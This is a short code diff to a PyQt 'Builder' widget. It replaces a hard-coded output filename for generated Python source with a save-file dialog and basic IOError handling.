@@ -128,7 +128,13 @@ class Builder(QWidget, builderUi):
         generator.use_webcam(self.check_remote_webcam())
 
         # generate
-        generator.generate_source('source.py')
+        file_name = QFileDialog.getSaveFileName(self, _('BUILDER_SAVE_FILE_NAME'), '', 'Python File (*.py)')
+        if file_name:
+            try:
+                generator.generate_source(file_name)
+            except IOError:
+                return
+        self.source_file_name = file_name
         self.toolBox.setCurrentIndex(1)
 
 
